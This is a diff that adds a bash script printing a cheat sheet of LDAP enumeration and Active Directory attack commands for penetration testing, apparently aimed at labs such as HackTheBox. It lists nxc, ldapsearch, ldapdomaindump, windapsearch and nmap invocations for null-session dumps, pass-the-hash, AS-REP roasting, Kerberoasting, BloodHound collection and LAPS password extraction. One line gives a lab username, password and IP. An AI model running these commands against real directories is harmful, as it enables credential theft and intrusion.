@@ -1,0 +1,58 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── LDAP — ENUMERATION & ATTACKS ─────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc LDAP ─────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}nxc ldap <TARGET> -u '' -p '' --users --groups${NC}       # null session"
+echo -e "  ${GREEN}nxc ldap <TARGET> -u <USER> -p <PASS> --users --active-users --groups${NC}  # with creds"
+echo -e "  ${GREEN}nxc ldap <TARGET> -u <USER> -p <PASS> --computers${NC}    # computer accounts"
+echo -e "  ${GREEN}nxc ldap <TARGET> -u <USER> -p <PASS> --find-delegation${NC}  # delegation configs"
+echo -e "  ${GREEN}nxc ldap <TARGET> -u <USER> -p <PASS> --dc-list${NC}      # DC list + trusts"
+echo -e "  ${GREEN}nxc ldap <TARGET> -u <USER> -p <PASS> --pso${NC}          # fine-grained password policy"
+echo -e "  ${GREEN}nxc ldap <TARGET> -u <USER> -H <NTLM-HASH> --users${NC}   # PTH"
+echo -e "  ${GREEN}nxc ldap <TARGET> -u <USER> -p <PASS> --query '(sAMAccountType=805306368)' 'sAMAccountName description'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc LDAP Attacks ─────────────────────────────────${NC}"
+echo -e "  ${GREEN}nxc ldap <DC_IP> -u <USER> -p <PASS> --asreproast hashes.txt${NC}   # AS-REP roast"
+echo -e "  ${GREEN}nxc ldap <DC_IP> -u <USER> -p <PASS> --kerberoasting hashes.txt${NC}  # Kerberoast"
+echo -e "  ${GREEN}nxc ldap <DC_IP> -u <USER> -p <PASS> --bloodhound --collection All -ns <DC_IP>${NC}  # BloodHound"
+echo -e "  ${GREEN}nxc ldap <TARGET> -u <USER> -p <PASS> -M get-userPassword${NC}  # plaintext LDAP passwords"
+echo -e "  ${GREEN}nxc ldap <TARGET> -u <USER> -p <PASS> --module laps${NC}  # LAPS"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── ldapsearch ───────────────────────────────────────${NC}"
+echo -e "  ${GREEN}ldapsearch -LLL -x -H ldap://<TARGET> -b '' -s base '(objectclass=*)'${NC}  # anon base query"
+echo -e "  ${GREEN}ldapsearch -H ldap://<TARGET> -x -s base namingcontexts${NC}  # naming contexts"
+echo -e "  ${GREEN}ldapsearch -h <TARGET> -x -b 'DC=corp,DC=com'${NC}     # anon domain dump"
+echo -e "  ${GREEN}ldapsearch -x -H ldap://<TARGET> -b 'DC=corp,DC=com' -D '<USER>@corp.com' -W${NC}"
+echo -e "  ${GREEN}ldapsearch -x -H ldap://<TARGET> -b 'DC=corp,DC=com' '(objectClass=user)' sAMAccountName${NC}"
+echo -e "  ${GREEN}ldapsearch -h <TARGET> -D cn=<USER>,dc=corp,dc=com -w '<PASS>' -x -b 'dc=corp,dc=com'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── ldapdomaindump ───────────────────────────────────${NC}"
+echo -e "  ${GREEN}ldapdomaindump <TARGET> -u 'DOMAIN\\<USER>' -p '<PASS>' --no-json --no-grep -o /tmp/ldap/${NC}"
+echo -e "  ${GREEN}ldapdomaindump -u 'htb.local\\amanda' -p Ashare1972 10.10.10.103 -o ~/ldap/${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── windapsearch ─────────────────────────────────────${NC}"
+echo -e "  ${GREEN}./windapsearch.py -d <DOMAIN> -u <DOMAIN>\\<USER> -p <PASS> -U${NC}  # enumerate users"
+echo -e "  ${GREEN}python3 windapsearch.py --dc-ip <DC_IP> -u '' --da${NC}  # domain admins anon"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Nmap LDAP ────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}nmap --script ldap-rootdse -p389 <TARGET>${NC}"
+echo -e "  ${GREEN}nmap --script ldap-search -p389 <TARGET>${NC}"
+echo -e "  ${GREEN}nmap --script ldap* -p389,636 <TARGET>${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
